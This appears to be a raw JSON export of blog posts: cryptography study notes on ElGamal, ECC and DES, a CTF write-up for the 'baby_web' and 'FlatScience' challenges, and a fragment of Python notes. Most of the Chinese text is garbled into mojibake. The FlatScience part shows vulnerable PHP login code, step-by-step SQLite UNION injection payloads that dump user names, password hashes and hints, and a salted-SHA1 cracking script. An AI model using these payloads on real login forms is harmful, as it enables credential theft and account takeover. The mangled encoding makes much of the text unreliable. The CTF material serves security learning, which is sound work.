ç”¨æˆ·Aå…ˆæŠŠæ˜æ–‡ğ‘€ç¼–ç ä¸ºä¸€ä¸ªåœ¨ 0 åˆ°ğ‘ï¼1ä¹‹é—´çš„æ•´æ•°ğ‘šï¼› ç”¨æˆ·AæŒ‘é€‰ä¸€ä¸ªç§˜å¯†éšæœºæ•° ğ‘Ÿ ( 2â‰¤ ğ‘Ÿ â‰¤ ğ‘ï¼2 )ï¼Œå¹¶è®¡ç®—ï¼šğ‘1ï¼ ğ‘”^ğ‘Ÿ (ğ‘šğ‘œğ‘‘ ğ‘)ï¼›ğ‘2 ï¼ ğ‘šâˆ™ğ‘¦^ğ‘Ÿ(ğ‘šğ‘œğ‘‘ ğ‘) ç”¨æˆ·AæŠŠäºŒå…ƒç»„ (ğ’„ğŸ ,ğ’„ğŸ) ä½œä¸ºå¯†æ–‡ä¼ é€ç»™ç”¨æˆ·B3.è§£å¯†ç”¨æˆ·Bæ¥æ”¶åˆ°å¯†æ–‡äºŒå…ƒç»„(ğ‘1 ,ğ‘2)åï¼Œåšè§£å¯†è®¡ç®—ï¼šğ’=ğ’„ğŸâˆ™(ğ’„ğŸ^ğ’™ )^(âˆ’ğŸ) ğ’ğ’ğ’… ğ’‘ 4.ElGamalç®—æ³•ç‰¹ç‚¹ï¼š éç¡®å®šæ€§ï¼šç”±äºå¯†æ–‡ä¾èµ–äºåŠ å¯†è¿‡ç¨‹ä¸­ç”¨æˆ·Aé€‰æ‹©çš„éšæœºæ•°ğ‘Ÿ ï¼Œæ‰€ä»¥åŠ å¯†ç›¸åŒçš„æ˜æ–‡å¯èƒ½ä¼šäº§ç”Ÿä¸åŒçš„å¯†æ–‡â€”æ¦‚ç‡åŠ å¯† å¯†æ–‡ç©ºé—´å¤§äºæ˜æ–‡ç©ºé—´ï¼šæ˜æ–‡ç©ºé—´ä¸ºã€–ğ‘_ğ‘ã€—^âˆ—ï¼Œè€Œå¯†æ–‡ç©ºé—´ä¸ºã€–ğ‘_ğ‘ã€—^âˆ—Ã—ã€–ğ‘_ğ‘ã€—^âˆ—ElGamalçš„å®‰å…¨æ€§ å…¬é’¥å¯†ç ä½“åˆ¶ECC(æ¤­åœ†æ›²çº¿å¯†ç ä½“åˆ¶)åŸºäºæ¤­åœ†æ›²çº¿ç¦»æ•£å¯¹æ•°é—®é¢˜å¯ç”¨æ›´çŸ­çš„å¯†é’¥è·å¾—åŒRSAä¸€æ ·çš„å®‰å…¨æ€§ æ¤­åœ†æ›²çº¿ä¸Šçš„è¿ç®— ğ’ª ç§°ä¸ºåŠ æ³•å•ä½å…ƒï¼Œå¯¹ECCä¸Šä»»æ„ç‚¹ğ‘ƒï¼šğ‘ƒï¼‹ğ’ª ï¼ğ‘ƒ åŠ æ³•é€†å…ƒï¼šECCä¸Šçš„ç‚¹ğ‘ƒ çš„åŠ æ³•é€†å…ƒâˆ’ğ‘·å®šä¹‰ä¸ºï¼šå…·æœ‰ç›¸åŒ ğ’™ åæ ‡å’Œè´Ÿğ’š åæ ‡çš„ç‚¹ï¼Œå³è¿‡ğ‘ƒç‚¹çš„å‚çº¿ä¸æ›²çº¿ç›¸äº¤çš„å¦å¤–ä¸€ç‚¹ å¯¹ECCä¸Šğ‘¥ åæ ‡ä¸åŒçš„ä¸¤ç‚¹ğ‘ƒã€ğ‘„ï¼Œç‚¹åŠ ğ‘·+ğ‘¸å®šä¹‰ä¸ºï¼šè¿æ¥ğ‘ƒå’Œğ‘„çš„ç›´çº¿å’Œæ›²çº¿ç›¸äº¤äºç‚¹ğ‘…ï¼Œåˆ™ğ‘ƒ+ğ‘„çš„å€¼ä¸ºğ‘…çš„åŠ æ³•é€†å…ƒ å€ç‚¹ğ‘·+ğ‘·è¿ç®—å®šä¹‰ï¼šåšç‚¹ğ‘ƒçš„åˆ‡çº¿ï¼Œè®¾åˆ‡çº¿ä¸ECCäº¤äºç‚¹ğ‘…ï¼Œåˆ™å€ç‚¹ä¸ºğ‘…çš„é€†å…ƒï¼Œå³ï¼š2ğ‘ƒ =ğ‘ƒ+ğ‘ƒ= âˆ’ğ‘… ç±»ä¼¼ï¼šğ‘˜ğ‘ƒ=ğ‘ƒ+ğ‘ƒ+ğ‘ƒ+â€¦+ğ‘ƒ æœ‰é™åŸŸä¸Šæ¤­åœ†æ›²çº¿åŠ æ³• æ¤­åœ†æ›²çº¿å¯†ç ç®—æ³•1.å¯†é’¥å¯¹ç”Ÿæˆ2.åŠ å¯†ç®—æ³•3.è§£å¯†ç®—æ³•å°ç»“ å…¬é’¥ä½“åˆ¶çš„é—®é¢˜ç¼ºå°‘èº«ä»½è®¤è¯æœºåˆ¶==&gt;åŸºäºèº«ä»½çš„åŠ å¯†ä½“åˆ¶IBE å…¬é’¥å¯†ç ä½“åˆ¶çš„å®‰å…¨æ€§å…¬é’¥å¯†ç çš„ä¼˜ç‚¹ï¼ˆä¸å¯¹ç§°å¯†ç ç›¸æ¯”ï¼‰ å¯†é’¥åˆ†å‘ç®€å• éœ€ç§˜å¯†ä¿å­˜çš„å¯†é’¥é‡å°‘ å¯ä»¥æ»¡è¶³äº’ä¸è®¤è¯†çš„äººä¹‹é—´ç§äººè°ˆè¯çš„ä¿å¯†æ€§ å¯ä»¥å®ç°æ•°å­—ç­¾åå’Œè®¤è¯çš„åŠŸèƒ½ å…¬é’¥å¯†ç çš„ä¸è¶³ï¼ˆä¸å¯¹ç§°å¯†ç ç›¸æ¯”ï¼‰ å…¬é’¥å¯†ç ç®—æ³•æ¯”å¯¹ç§°å¯†ç ç®—æ³•æ…¢ å…¬é’¥å¯†ç ç®—æ³•æä¾›æ›´å¤šçš„ä¿¡æ¯å¯¹ç®—æ³•è¿›è¡Œæ”»å‡»ï¼Œå¦‚å…¬é’¥å¯†ç ç®—æ³•å¯¹é€‰æ‹©æ˜æ–‡æ”»å‡»æ˜¯è„†å¼±çš„ï¼Œå°¤å…¶æ˜æ–‡é›†æ¯”è¾ƒå°æ—¶ æ•°æ®æ‰©å±• å…¬é’¥å¯†ç ç®—æ³•ä¸€èˆ¬æ˜¯å»ºç«‹åœ¨ç‰¹å®šçš„æ•°å­¦éš¾é¢˜ä¹‹ä¸Šï¼Œå¾€å¾€è¿™ç§å›°éš¾æ€§åªæ˜¯ä¸€ç§è®¾æƒ³ #è¡¥å…… è§£å†³å¯¹ç§°åŠ å¯†å’Œå…¬é’¥åŠ å¯†ä¸­çš„ä¸è¶³-æ··åˆåŠ å¯†","categories":[{"name":"notes","slug":"notes","permalink":"https://singlemindedt.github.io/categories/notes/"},{"name":"å¯†ç å­¦","slug":"notes/å¯†ç å­¦","permalink":"https://singlemindedt.github.io/categories/notes/å¯†ç å­¦/"}],"tags":[]},{"title":"åˆ†ç»„å¯†ç ","slug":"åˆ†ç»„å¯†ç ","date":"2019-12-18T08:28:39.000Z","updated":"2019-12-20T01:28:23.523Z","comments":true,"path":"2019/12/18/åˆ†ç»„å¯†ç /","link":"","permalink":"https://singlemindedt.github.io/2019/12/18/åˆ†ç»„å¯†ç /","excerpt":"","text":"æ¦‚å¿µå°†æ˜æ–‡åˆ’åˆ†æˆé•¿ä¸ºğ‘š(å¦‚ğ‘š=64æˆ–128)çš„åˆ†ç»„ğ‘ƒï¼(ğ‘0, ğ‘1, ğ‘2, â€¦.,ğ‘(ğ‘šâˆ’1))ï¼Œå„æ˜æ–‡åˆ†ç»„åˆ†åˆ«åœ¨é•¿ä¸ºtçš„å¯†é’¥ğ¾ï¼(ğ‘˜0, ğ‘˜1, ğ‘˜2, â€¦.,ğ‘˜(ğ‘¡âˆ’1)) çš„æ§åˆ¶ä¸‹å˜æ¢æˆé•¿ä¸ºğ‘›çš„å¯†æ–‡åˆ†ç»„ğ¶ï¼(ğ‘0, ğ‘1, ğ‘2, â€¦,ğ‘_(ğ‘›âˆ’1))ã€‚(ä¸€èˆ¬ ğ‘š=ğ‘›) ç‰¹ç‚¹é€Ÿåº¦å¿«ã€å®‰å…¨æ€§è¾ƒé«˜ã€æ˜“äºæ ‡å‡†åŒ–å’Œä¾¿äºè½¯ç¡¬ä»¶å®ç°æ„é€ ä¼ªéšæœºæ•°ç”Ÿæˆå™¨ã€åºåˆ—å¯†ç ã€æ¶ˆæ¯è®¤è¯ç å’ŒHashå‡½æ•°çš„æ–¹æ³• è®¾è®¡è¦æ±‚1.åˆ†ç»„é•¿åº¦è¦è¶³å¤Ÿå¤§å‡è®¾ğ‘›ä¸ºåˆ†ç»„é•¿åº¦ï¼Œåˆ™è¦ä½¿2ğ‘›è¶³å¤Ÿå¤§ï¼Œé˜²æ­¢æ˜æ–‡ç©·ä¸¾æ”»å‡»2.å¯†é’¥é‡è¦è¶³å¤Ÿå¤§é˜²æ­¢å¯†é’¥ç©·ä¸¾æ”»å‡»3.å¯†ç å˜æ¢è¦è¶³å¤Ÿå¤æ‚ä½¿æ”»å‡»è€…é™¤ç©·ä¸¾æ”»å‡»å¤–ï¼Œæ‰¾ä¸åˆ°å…¶ä»–ç®€æ´çš„æ•°å­¦æ”»å‡»æ–¹æ³•4.åŠ å¯†å’Œè§£å¯†è¿ç®—ç®€å•ä¾¿äºè½¯ä»¶å’Œç¡¬ä»¶çš„å®ç°5.æ— æ•°æ®æ‰©å±•å’Œå‹ç¼© è®¾è®¡æ€æƒ³æ‰©æ•£æ‰©æ•£åŸåˆ™ï¼ˆç§»ä½ï¼‰ï¼šå¯†é’¥æˆ–æ˜æ–‡çš„æ¯ä¸€æ¯”ç‰¹å˜åŒ–å½±å“å¯†æ–‡çš„è®¸å¤šæ¯”ç‰¹çš„å˜åŒ–ï¼Œä»¥ä¾¿éšè”½æ˜æ–‡çš„ç»Ÿè®¡ç‰¹æ€§(å½¢è±¡çš„ç§°ä¸ºé›ªå´©æ•ˆåº”) æ··æ·†æ··æ·†åŸåˆ™ï¼ˆæ›¿ä»£ï¼‰ï¼šåˆç§°æ··ä¹±åŸåˆ™ï¼ŒæŒ‡å¯†é’¥å’Œæ˜æ–‡ä»¥åŠå¯†æ–‡ä¹‹é—´çš„ä¾èµ–å…³ç³»å°½å¯èƒ½çš„å¤æ‚åŒ–ï¼Œä»¥é˜²é€šè¿‡ç»Ÿè®¡åˆ†ææ³•è¿›è¡Œç ´è¯‘ï¼ˆæ··ä¹±å¿…é¡»æ˜¯å¯é€†çš„ï¼ï¼‰ åŸç†ä¹˜ç§¯å¯†ç æ‰©æ•£å’Œæ··ä¹±ä¸¤ç§åŸºæœ¬å¯†ç æ“ä½œçš„ç»„åˆå˜æ¢(ä¹˜ç§¯å¯†ç ) ä¹˜ç§¯å¯†ç çš„å®ç°â€”SPNç½‘ç»œSå˜æ¢èµ·æ··æ·†çš„ä½œç”¨ï¼› På˜æ¢èµ·æ‰©æ•£çš„ä½œç”¨SPNå…·æœ‰é›ªå´©æ•ˆåº”ï¼šè¾“å…¥(æ˜æ–‡æˆ–å¯†é’¥)å³ä½¿åªæœ‰å¾ˆå°çš„å˜åŒ–ï¼Œä¹Ÿä¼šå¯¼è‡´è¾“å‡ºæœ‰å¾ˆå¤§çš„å˜åŒ– åˆ†ç»„å¯†ç ç®—æ³•DES###ç®—æ³•æè¿°^-^:(1) DESçš„åŠ å¯†æµç¨‹å›¾ åˆå§‹ç½®æ¢IPå’Œåˆå§‹é€†ç½®æ¢IP-1(å¦‚åŸæ¥ç¬¬58ä½çš„æ•°æ®ç½®æ¢åæ”¾åœ¨ç¬¬1ä½) 16è½®è¿­ä»£åœ¨æ¯è½®è¿­ä»£ä¸­ï¼Œ64ä½çš„ä¸­é—´ç»“æœè¢«åˆ†æˆå·¦å³ä¸¤éƒ¨åˆ†ï¼Œä¸”ä½œä¸ºç›¸äº’ç‹¬ç«‹çš„32ä½æ•°æ®è¿›è¡Œå¤„ç†ã€‚æ¯è½®è¿­ä»£çš„è¾“å…¥æ˜¯ä¸Šè½®çš„ç»“æœğ¿ğ‘–ï¼1å’Œğ‘…ğ‘–ï¼1 åŠ å¯†å‡½æ•°F Eæ‰©å±•ç½®æ¢E-æ‰©å±•ï¼š32æ¯”ç‰¹æ‰©å±•ä¸º48æ¯”ç‰¹ æ‰©å±•æ–¹æ³•ï¼šæ¯ä¸ªè¾“å…¥åˆ†ç»„çš„4ä½ä½œä¸º6ä½è¾“å‡ºåˆ†ç»„çš„ä¸­é—´4ä½ï¼Œ6ä½è¾“å‡ºåˆ†ç»„ä¸­çš„ç¬¬1ã€6ä½åˆ†åˆ«ç”±ç›¸é‚»ä¸¤ä¸ª4ä½åˆ†ç»„çš„æœ€å¤–é¢ä¸¤ä½æ‰©æ•£è¿›å…¥åˆ°æœ¬åˆ†ç»„ï¼Œå…¶ä¸­ç¬¬1ä¸ªåˆ†ç»„çš„å·¦ä¾§ç›¸é‚»åˆ†ç»„ä¸ºæœ€å1ä¸ªåˆ†ç»„ ###ä¸å­å¯†é’¥å¼‚æˆ–å°†Eç›’æ‰©å±•å¾—åˆ°çš„48ä½è¾“å‡ºä¸å­å¯†é’¥ğ¾ğ‘–è¿›è¡Œå¼‚æˆ–è¿ç®— å‹ç¼©æ›¿æ¢S-ç›’ï¼šç”±8ä¸ªS-ç›’æ„æˆ, æ¯ä¸ªS-ç›’éƒ½æ˜¯6æ¯”ç‰¹çš„è¾“å…¥ï¼Œ4æ¯”ç‰¹çš„è¾“å‡ºğ‘ ğ‘–(â„1â„2â„3â„4â„5â„6)çš„å€¼æ˜¯å¯¹åº”è¡¨ğ‘ ğ‘–ä¸­(â„1â„6)è¡Œå’Œ(â„2â„3â„4â„5)åˆ—ä¸Šçš„å€¼ S-ç›’çš„æ„é€ ï¼ˆè®¡ç®—é¢˜ï¼‰ P-ç½®æ¢P-ç½®æ¢å¯¹8ä¸ªS-ç›’çš„è¾“å‡ºè¿›è¡Œå˜æ¢ DESçš„è§£å¯†è¿‡ç¨‹ DESå­å¯†é’¥ç”ŸæˆDESå­å¯†é’¥æ˜¯ä»åˆå§‹å¯†é’¥(ç§å­å¯†é’¥)äº§ç”Ÿçš„ ç§å­å¯†é’¥ğ¾ä¸º64ä½ï¼Œå…¶ä¸­æœ‰8ä½ç”¨äºå¥‡å¶æ ¡éªŒï¼Œåˆ†åˆ«ä½äºç¬¬8ï¼Œ16ï¼Œ24ï¼Œ32ï¼Œ40ï¼Œ48ï¼Œ56ï¼Œ64ä½ å¥‡å¶æ ¡éªŒä½ç”¨äºæ£€æŸ¥å¯†é’¥ğ¾åœ¨äº§ç”Ÿå’Œåˆ†é…ä»¥åŠå­˜å‚¨è¿‡ç¨‹ä¸­å¯èƒ½å‘ç”Ÿçš„é”™è¯¯ DESçš„å¯†é’¥å®é™…ä¸Šåªæœ‰56ä½* DESçš„å®‰å…¨æ€§ å¯¹DESçš„Sç›’ã€è¿­ä»£æ¬¡æ•°ã€å¯†é’¥é•¿åº¦ç­‰è®¾è®¡å‡†åˆ™çš„äº‰è®® DESå­˜åœ¨ä¸€äº›å¼±å¯†é’¥å’ŒåŠå¼±å¯†é’¥ DESçš„56ä½å¯†é’¥æ— æ³•æŠµæŠ—ç©·ä¸¾æ”»å‡» ä»£æ•°ç»“æ„å­˜åœ¨äº’è¡¥å¯¹ç§°æ€§å¼±å¯†é’¥ ç»™å®šåˆå§‹å¯†é’¥ğ‘²ç”Ÿæˆå­å¯†é’¥æ—¶ï¼Œå°†ç§å­å¯†é’¥ï¼ˆå»é™¤äº†å¥‡å¶æ ¡éªŒä½åï¼‰åˆ†æˆä¸¤ä¸ªéƒ¨åˆ†ï¼Œå¦‚æœğ‘²ä½¿å¾—è¿™ä¸¤éƒ¨åˆ†çš„æ¯ä¸€éƒ¨åˆ†çš„æ‰€æœ‰ä½ç½®å…¨ä¸º0æˆ–1ï¼Œåˆ™ç»å­å¯†é’¥äº§ç”Ÿå™¨äº§ç”Ÿçš„å„ä¸ªå­å¯†é’¥éƒ½ç›¸åŒï¼Œå³ğ‘²ğŸ=ğ‘²ğŸ=â€¦=ğ‘²ğŸğŸ”ï¼Œåˆ™ç§°å¯†é’¥ğ‘²ä¸ºå¼±å¯†é’¥ï¼ˆå…±æœ‰4ä¸ªï¼‰ è‹¥ğ‘²ä¸ºå¼±å¯†é’¥ï¼Œåˆ™å¯¹ä»»æ„çš„64æ¯”ç‰¹ä¿¡æ¯æœ‰ï¼š***ğ‘¬ğ’Œ(ğ‘¬ğ’Œ(ğ’))= ğ’ å’Œ ğ‘«ğ’Œ(ğ‘«ğ’Œ(ğ’))= ğ’*** åŠå¼±å¯†é’¥ åŠå¼±å¯†é’¥ï¼šæŠŠæ˜æ–‡åŠ å¯†æˆç›¸åŒçš„å¯†æ–‡ï¼Œå³å­˜åœ¨ä¸¤ä¸ªä¸åŒçš„å¯†é’¥ğ’Œå’Œğ’Œâ€²,ä½¿å¾—ğ‘¬ğ’Œ (ğ’)=ğ‘¬(ğ’Œ^â€² ) (ğ’) å…·æœ‰ä¸‹è¿°æ€§è´¨ï¼šè‹¥ğ’Œå’Œğ’Œâ€²ä¸ºä¸€å¯¹å¼±å¯†é’¥ï¼Œğ’ä¸ºæ˜æ–‡ç»„ï¼Œåˆ™æœ‰ï¼š ğ‘¬(ğ’Œ^â€² ) (ğ‘¬_ğ’Œ (ğ’))=ğ‘¬_ğ’Œ (ğ‘¬(ğ’Œ^â€² ) (ğ’))=ğ’*äº’è¡¥æ€§ å¯¹æ˜æ–‡ğ’é€ä½å–è¡¥ï¼Œè®°ä¸ºğ’ Ì…ï¼Œå¯†é’¥ğ‘²é€ä½å–è¡¥ï¼Œè®°ä¸ºğ’Œ Ì… ï¼Œ è‹¥ğ’„=ğ‘¬ğ’Œ(ğ’)ï¼Œåˆ™æœ‰ğ’„ Ì…=ğ‘¬_ğ’Œ Ì… (ğ’ Ì…) ï¼Œç§°ä¸ºç®—æ³•ä¸Šçš„äº’è¡¥æ€§ç”±ç®—æ³•ä¸­ä¸¤æ¬¡å¼‚æˆ–è¿ç®—çš„é…ç½®å†³å®šï¼šä¸¤æ¬¡å¼‚æˆ–è¿ç®—ä¸€æ¬¡åœ¨Sç›’ä¹‹å‰ï¼Œä¸€æ¬¡åœ¨Pç›’ç½®æ¢ä¹‹å è‹¥å¯¹DES çš„æ˜æ–‡å’Œå¯†é’¥åŒæ—¶å–è¡¥ï¼Œåˆ™æ‰©å±•è¿ç®—Eçš„è¾“å‡ºå’Œå­å¯†é’¥äº§ç”Ÿå™¨çš„è¾“å‡ºä¹Ÿéƒ½å–è¡¥ï¼Œå› è€Œç»å¼‚æˆ–è¿ç®—åçš„è¾“å‡ºå’Œæœªå–è¡¥æ—¶çš„è¾“å‡ºä¸€æ ·ï¼Œå³åˆ°è¾¾Sç›’çš„è¾“å…¥æ•°æ®æœªå˜ï¼Œè¾“å‡ºè‡ªç„¶ä¹Ÿä¸å˜ï¼Œä½†ç»ç¬¬äºŒä¸ªå¼‚æˆ–è¿ç®—æ—¶ï¼Œç”±äºå·¦è¾¹æ•°æ®å·²å–è¡¥ï¼Œå› è€Œè¾“å‡ºä¹Ÿå°±å–è¡¥ äº’è¡¥æ€§ä½¿DESåœ¨é€‰æ‹©æ˜æ–‡æ”»å‡»ä¸‹æ‰€éœ€çš„å·¥ä½œé‡å‡åŠ å¤šé‡DES3DES AES","categories":[{"name":"notes","slug":"notes","permalink":"https://singlemindedt.github.io/categories/notes/"},{"name":"å¯†ç å­¦","slug":"notes/å¯†ç å­¦","permalink":"https://singlemindedt.github.io/categories/notes/å¯†ç å­¦/"}],"tags":[{"name":"notes","slug":"notes","permalink":"https://singlemindedt.github.io/tags/notes/"}]},{"title":"baby_web+FlatScience","slug":"baby-web","date":"2019-12-18T00:36:20.000Z","updated":"2019-12-30T05:00:31.351Z","comments":true,"path":"2019/12/18/baby-web/","link":"","permalink":"https://singlemindedt.github.io/2019/12/18/baby-web/","excerpt":"","text":"[TOC] baby_webé¢˜ç›®æç¤ºï¼šæƒ³æƒ³åˆå§‹é¡µé¢æ˜¯å“ªä¸ª å®é™…æ“ä½œï¼šè€ƒè™‘åˆ°å¯èƒ½æ˜¯é¡µé¢302é‡å®šå‘æŠ“åŒ…å¾—åˆ°flag FlatScienceå®é™…æ“ä½œç‚¹è¿›å»æœ‰å¥½å¤šé“¾æ¥ï¼Œä¸‹è½½PDFï¼Œè·³å›ç­‰ï¼› æŸ¥çœ‹robots.txt(robots.txt:æ˜¯æœç´¢å¼•æ“ä¸­è®¿é—®ç½‘ç«™çš„æ—¶å€™è¦æŸ¥çœ‹çš„ç¬¬ä¸€ä¸ªæ–‡ä»¶ã€‚robots.txtæ–‡ä»¶å‘Šè¯‰èœ˜è››ç¨‹åºåœ¨æœåŠ¡å™¨ä¸Šä»€ä¹ˆæ–‡ä»¶æ˜¯å¯ä»¥è¢«æŸ¥çœ‹çš„ã€‚)è®¿é—®:http://111.198.29.45:34978/robots.txt 123User-agent: *Disallow: /login.phpDisallow: /admin.php è®¿é—®login.php:å¾—åˆ°äº†ä¸€ä¸ªç™»é™†é¡µé¢ï¼Œå°è¯•sqli,æç¤ºï¼š 12Warning: SQLite3::query(): Unable to prepare statement: 1, unrecognized token: \"2801497d9ca18eef4382b18d1889b8bc97e28461\" in /var/www/html/login.php on line 47Some Error occourred! å¯ä»¥çœ‹åˆ°ä½¿ç”¨çš„æ˜¯SQLiteæ•°æ®åº“,è¿˜æœ‰åŠ å¯†æ“ä½œï¼Ÿ è®¿é—®ç½‘é¡µæºç ï¼š æœ‰å‚æ•°æç¤ºdebug;å°è¯•è®¿é—®login.php?debugå¾—åˆ°å¦‚ä¸‹phpä»£ç ï¼š 1234567891011121314151617181920212223242526&lt;?phpif(isset($_POST['usr']) &amp;&amp; isset($_POST['pw']))&#123; $user = $_POST['usr']; $pass = $_POST['pw']; $db = new SQLite3('../fancy.db'); $res = $db-&gt;query(\"SELECT id,name from Users where name='\".$user.\"' and password='\".sha1($pass.\"Salz!\").\"'\"); if($res)&#123; $row = $res-&gt;fetchArray(); &#125; else&#123; echo \"&lt;br&gt;Some Error occourred!\"; &#125; if(isset($row['id']))&#123; setcookie('name',' '.$row['name'], time() + 60, '/'); header(\"Location: /\"); die(); &#125;&#125;if(isset($_GET['debug']))highlight_file('login.php');?&gt; å¯ä»¥çœ‹åˆ°SQLçš„æŸ¥è¯¢è¯­å¥ï¼Œå¹¶ä¸”å¯¹å¯†ç è¿›è¡Œäº†åŠ å¯†æ“ä½œ(sha1+salt&lt;=ï¼ˆalzï¼ï¼‰);é¡µé¢æ³¨å…¥ä¸æˆï¼ŒæŠ“åŒ…åˆ†æä¸‹ï¼šæ„é€ ï¼š 1usr='union select name,sql from sqlite_master--+n&amp;pw=233 å¾—åˆ°ï¼š 1Set-Cookie: name=+CREATE+TABLE+Users%28id+int+primary+key%2Cname+varchar%28255%29%2Cpassword+varchar%28255%29%2Chint+varchar%28255%29%29; URLç¼–ç è½¬æ¢ä¸€ä¸‹ï¼š%27=&gt;â€™;%28=&gt;(;%29=&gt;); 12CREATE TABLE Users(id int primary key,name varchar(255),password varchar(255),hint varchar(255)) çœ‹åˆ°Usersè¡¨ã€id,name,password.hintå­—æ®µï¼›æ„é€ æŸ¥è¯¢è¯­å¥ï¼š 12345idusr='union select id,id from Users limit 0,1--&amp;pw=233usr='union select id,id from Users limit 1,1--&amp;pw=233usr='union select id,id from Users limit 2,1--&amp;pw=233å¾—åˆ°3ä¸ªidï¼› 1234usr='union select id,name from Users limit 0,1--&amp;pw=233usr='union select id,name from Users limit 1,1--&amp;pw=233usr='union select id,name from Users limit 2,1--&amp;pw=233å¾—åˆ°nameï¼šadminã€fritzeã€hansi 1234567usr='union select id,password from Users limit 0,1--&amp;pw=233usr='union select id,password from Users limit 1,1--&amp;pw=233usr='union select id,password from Users limit 2,1--&amp;pw=233å¾—åˆ°passwordï¼š3fab54a50e770d830c0416df817567662a9dc85c54eae8935c90f467427f05e4ece82cf569f8950734b0bb7c304949f9ff2fc101eef0f048be10d3bd 1234567usr='union select id,hint from Users limit 0,1--&amp;pw=233usr='union select id,hint from Users limit 1,1--&amp;pw=233usr='union select id,hint from Users limit 2,1--&amp;pw=233å¾—åˆ°hintï¼šmy+fav+word+in+my+fav+paper%3F%21my+love+is%E2%80%A6%3Fthe+password+is+password æ ¹æ®adminç”¨æˆ·çš„æç¤ºmy fav word in my fav paperï¼Ÿï¼åº”è¯¥æ˜¯ï¼šå¯†ç +â€Salz!â€åšsha1å¤„ç†ï¼Œå¯†ç åº”è¯¥å°±äº§ç”Ÿäºpdfä¸­ï¼› å› ä¸ºæˆ‘é—¨çŸ¥é“äº†åŠ å¯†ç»“æœç›´æ¥è§£å¯†å»æ‰Salzå°±å¾—åˆ°å¯†ç äº†ï¼š è§£å¯† ä¹Ÿå¯ä»¥ç”¨pdfä¸­çš„å•è¯è¿›è¡Œ+Salz!å†åšsha1ï¼› å€Ÿç”¨ä¸€ä¸‹åˆ«äººçš„Pythonè„šæœ¬ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041from cStringIO import StringIOfrom pdfminer.pdfinterp import PDFResourceManager, PDFPageInterpreterfrom pdfminer.converter import TextConverterfrom pdfminer.layout import LAParamsfrom pdfminer.pdfpage import PDFPageimport sysimport stringimport osimport hashlib def get_pdf(): return [i for i in os.listdir(\"./\") if i.endswith(\"pdf\")] def convert_pdf_2_text(path): rsrcmgr = PDFResourceManager() retstr = StringIO() device = TextConverter(rsrcmgr, retstr, codec='utf-8', laparams=LAParams()) interpreter = PDFPageInterpreter(rsrcmgr, device) with open(path, 'rb') as fp: for page in PDFPage.get_pages(fp, set()): interpreter.process_page(page) text = retstr.getvalue() device.close() retstr.close() return text def find_password(): pdf_path = get_pdf() for i in pdf_path: print \"Searching word in \" + i pdf_text = convert_pdf_2_text(i).split(\" \") for word in pdf_text: sha1_password = hashlib.sha1(word+\"Salz!\").hexdigest() if sha1_password == '3fab54a50e770d830c0416df817567662a9dc85c': print \"Find the password :\" + word exit() if __name__ == \"__main__\": find_password() çŸ¥è¯†è¡¥å……â€˜â€™â€™os.listdir() æ–¹æ³•ç”¨äºè¿”å›æŒ‡å®šçš„æ–‡ä»¶å¤¹åŒ…å«çš„æ–‡ä»¶æˆ–æ–‡ä»¶å¤¹çš„åå­—çš„åˆ—è¡¨ã€‚å®ƒä¸åŒ…æ‹¬ . å’Œ .. å³ä½¿å®ƒåœ¨æ–‡ä»¶å¤¹ä¸­ã€‚åªæ”¯æŒåœ¨ Unix, Windows ä¸‹ä½¿ç”¨ã€‚è¯­æ³•listdir()æ–¹æ³•è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼šos.listdir(path)å‚æ•°:path â€“ éœ€è¦åˆ—å‡ºçš„ç›®å½•è·¯å¾„è¿”å›å€¼:è¿”å›æŒ‡å®šè·¯å¾„ä¸‹çš„æ–‡ä»¶å’Œæ–‡ä»¶å¤¹åˆ—è¡¨ã€‚â€˜â€™â€™â€˜â€™â€™endswith() æ–¹æ³•ç”¨äºåˆ¤æ–­å­—ç¬¦ä¸²æ˜¯å¦ä»¥æŒ‡å®šåç¼€ç»“å°¾ï¼Œå¦‚æœä»¥æŒ‡å®šåç¼€ç»“å°¾è¿”å›Trueï¼Œå¦åˆ™è¿”å›Falseã€‚å¯é€‰å‚æ•°â€startâ€ä¸â€endâ€ä¸ºæ£€ç´¢å­—ç¬¦ä¸²çš„å¼€å§‹ä¸ç»“æŸä½ç½®ã€‚â€˜â€™â€™â€˜â€™â€™hashlibæ˜¯æ¶‰åŠå®‰å…¨æ•£åˆ—å’Œæ¶ˆæ¯æ‘˜è¦ï¼Œæä¾›å¤šä¸ªä¸åŒçš„åŠ å¯†ç®—æ³•æ¥å£ï¼Œå¦‚SHA1ã€SHA224ã€SHA256ã€SHA384ã€SHA512ã€MD5ç­‰ã€‚å…¶ä¸­hash.digest()è¿”å›æ‘˜è¦ï¼Œä½œä¸ºäºŒè¿›åˆ¶æ•°æ®å­—ç¬¦ä¸²å€¼hash.hexdigest()è¿”å›æ‘˜è¦ï¼Œä½œä¸ºåå…­è¿›åˆ¶æ•°æ®å­—ç¬¦ä¸²å€¼â€˜â€™â€™ å¾—åˆ°å¯†ç ï¼šThinJerboaè®¿é—®ï¼šadmin.php 12username=adminpassword=ThinJerboa å¾—åˆ°flag","categories":[{"name":"CTF","slug":"CTF","permalink":"https://singlemindedt.github.io/categories/CTF/"},{"name":"æ”»é˜²ä¸–ç•Œ","slug":"CTF/æ”»é˜²ä¸–ç•Œ","permalink":"https://singlemindedt.github.io/categories/CTF/æ”»é˜²ä¸–ç•Œ/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://singlemindedt.github.io/tags/Web/"}]},{"title":"Pythonç¬”è®°1","slug":"Pythonç¬”è®°1","date":"2019-12-16T14:47:15.000Z","updated":"2020-06-29T12:17:19.404Z","comments":true,"path":"2019/12/16/Pythonç¬”è®°1/","link":"","permalink":"https://singlemindedt.github.io/2019/12/16/Pythonç¬”è®°1/","excerpt":"","text":"æŠ¥è¯¯ï¼šSyntaxError: unexpected EOF while parsingä¸€èˆ¬æ˜¯æœ€åä¸€è¡Œæ‹¬å·æ²¡è¡¥å…¨ï¼Œæˆ–è€…å†™äº†forå¾ªç¯æ²¡å†™å¾ªç¯ä½“ï¼Œå› ä¸ºè§£é‡Šå™¨åˆ°åº•äº†åº¦æ²¡æ‰¾åˆ°å®ƒè¦æ‰¾åˆ°çš„ä¸œè¥¿ Pythoné€»è¾‘è¿ç®—ç¬¦and or not ä¼˜å…ˆçº§ï¼š() &gt; not &gt; and &gt; orhttps://www.cnblogs.com/zhangyanran/p/9896070.html Python lower() 